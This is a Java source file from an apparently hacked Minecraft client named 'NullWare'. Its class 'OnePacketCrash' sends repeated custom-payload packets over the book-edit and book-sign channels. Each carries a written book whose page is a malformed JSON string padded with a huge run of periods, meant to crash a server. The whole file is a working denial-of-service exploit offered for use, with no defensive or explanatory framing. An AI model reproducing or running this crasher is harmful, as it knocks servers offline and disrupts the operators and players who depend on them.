package com.Vxrtrauter.NullWare.command.commands.crashers;

import com.Vxrtrauter.NullWare.command.commands.CrashHandler;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import org.apache.commons.lang3.RandomStringUtils;
import io.netty.buffer.Unpooled;

import java.util.concurrent.ThreadLocalRandom;

public class OnePacketCrash implements CrashHandler {
    private final Minecraft mc = Minecraft.getMinecraft();

    @Override
    public void execute(int packets) {
        for (int i = 0; i < packets; i++) {
            ItemStack writtenBook = new ItemStack(Items.written_book);
            NBTTagCompound compound = new NBTTagCompound();
            NBTTagList pages = new NBTTagList();

            String extraJson = "{\"text\":\"\".................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................\"\"}";
            pages.appendTag(new NBTTagString(extraJson));

            compound.setString("author", RandomStringUtils.randomAlphabetic(10));
            compound.setString("title", RandomStringUtils.randomAlphabetic(10));
            compound.setByte("resolved", (byte) 1);
            compound.setTag("pages", pages);

            writtenBook.setTagCompound(compound);

            PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
            packetBuffer.writeItemStackToBuffer(writtenBook);

            C17PacketCustomPayload packet = new C17PacketCustomPayload(
                    ThreadLocalRandom.current().nextBoolean() ? "MC|BEdit" : "MC|BSign",
                    packetBuffer
            );

            mc.getNetHandler().getNetworkManager().sendPacket(packet);
        }
    }
}
